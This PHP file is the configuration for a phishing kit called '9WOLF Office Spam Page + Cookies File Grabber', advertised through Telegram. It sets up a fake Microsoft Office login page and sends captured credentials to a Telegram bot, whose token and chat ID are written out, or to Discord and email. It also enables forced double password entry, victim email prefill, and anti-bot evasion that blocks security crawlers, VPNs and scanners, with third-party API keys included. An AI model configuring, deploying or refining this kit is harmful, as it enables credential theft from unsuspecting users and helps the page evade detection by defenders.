<?php
//error_reporting(E_ALL ^ E_NOTICE);
/*

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Spam Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/


      
 		$show_attempt_Page = "false";  //Show Attempt Pages or Redirect to login page => true Or false
    // ================================= //	
        $Owner= "9WOLF"; // Do not touch it else you will die soon
        $YourName= "Jack"; //Your Name
        $PageName= "Office"; //Page Names Single
    // ==========Admin 	Panel============ //
		$saveItOnHost = "true";  //true // false /admin
	// ================================= //
	/*  Send Result To Telegram Bot */
	    $sendToTelegramBot = "true";
		$botToken="6372205649:AAE5fjhdopwwUdgka-WefnRJq6Tqdx5YMJ4";// Put your Telegram Token ID
		$chatId="6056212763";  // Put your Telegram chat ID
	// ================================= //
	
	/*  Send Result To Discord Bot */
	    $sendToDiscordBot = "false";
		$webHookUrl ="";// Put your Discord WebHook Url
	// ================================= //
	    $WOLFServer = "microsoft@engage.microsoft.com"; // Put your webmail email Address <>
	/*  Send Result To Email */
		$sendToEmail = "false";   // true or False
		$yourEmail = "admin@9wolf.io";  // Insert your email 
		// ==========Show Page============ // 
	// ==========Double Page============ //
		$doublePassword = "true";  // Enter Password Twice 
		$redirect = "false";   // Check Redirect
		$redirectFrom = "/";  // Domain where you upload Antibot Redirector
	// ================================= //
		/*  Trick About Send */
		$emailGrabber = "false";//Should Send as https://link.com?email=9wolf@example.com 
		$accessOneTime = "false";  // Access one Time From Email Grabber 
		$yourEmailGrabber = "5000";  // Your email To allow Enter More than one
		$listSent = "false";   //  Should Send as This https://link.com?email=9wolf@example.com   And Put Your list in (9WOLFGrabber/EmailListGrabber.txt)
	// ================================= //
		$countryBlock = "false";  // If You Want To Access Country You Choose To Go Scam Page 
		$allowdCountry = "US";  // write one Country
		$yourIPCountry = "0.0.2.15/"; // Allow Your Ip To Enter from any Country
	// ================================= //s
		$encrypt_html = "true"; // If you don`t want to encrypt pages hange from true to false
	// ================================= //
		$accessOneTimeIp = "false"; // Access one Time by ip
		$yourIPAceess = "185.251.19.201"; // Allow Your Ip To Enter More than One Time From your Location
	// ==========AntiBot Setting ============ //
	    $bot_protect= "on";  //Input "on" to switch ON Ultra Anti-bot system and off to switch off
	    $userAgent = "on"; // If you don't like to block User Agent on your page switch from on to off
		$block_ua = "on"; // If you don't like to block ua on your page switch from on to off
        $block_isp = "on"; // If you don't like to block Isp on your page switch from on to off
        $block_host = "on"; // If you don't like to block host on your page switch from on to off
		$block_iprange = "on"; // If you don't like to block IpRange on your page switch from on to off
		$block_vpn = "off"; // If you don't like to block vpn on your page switch from on to off(Note: This will never block Proxy)
		$block_proxy_rdp = "on"; // If you don't like to Alternative Proxy on your page switch from on to off(RDP user cannot access your page)
        $lock_platform = "off"; // If you don't like to Lock Platform on your page switch from on to off
    //==========antibot.pw api key here========== 
	    $AntiBotPw = "off";
        $antibotpw_api = '007f4a7685bb7b76021d3420dda0d925';//Insert your antibot.pw api key here
        $KillBot = 'off';
        $kill_bot_api = 'cZ_9iNhlCfOw0A-MejckRSjCRzfUG49A2Annxj3e6vFLe';//Insert your killbot.org api key here
// // =======ipqualityscore ======= //
// 		$api_protection = "yes";  			 // This Api For detect Frauds And Bad Bot From IP .
//         $Key = "qctgcSqKpuDXQr2hXUe06l8WjYbs7KPs"; // Fresh Key api protection DON't CHANGE IT 
//     // =======Proxy, Vpn & Tor =======  // You have to turn this on in case if line 88 and 89 api is down else Recomended(use 87 & 88)
//         $anti_proxy = "no";            // If you  like to allow Proxy  user on  your page hang from no to yes (This will block rdp user too)
//         $anti_vpn = "no";             // If you  like to allow Vpn  user on your page hang from no to yes
//         $anti_tor = "yes";           // If you like to allow Tor browser user on your page hang from yes to no
//     // =======Web Crawler =======   //
//         $anti_web_crawler ="yes";  // If you like to allow Web Crawler to acces your page hang from yes to no
//     // =======Fraud Score ======= //
//         $max_fraud_score = "106"; // Here is the  Max Fraud Score 105 is recommended but you can change it
//     // =======Bots Redirect ======= //
// 		//$path = "../site/"; // Put Link Here Where you like to Redirect Bots/cgi-sys/defaultwebpage.cgi https://transparencyreport.google.com/safe-browsing/search?hl=en


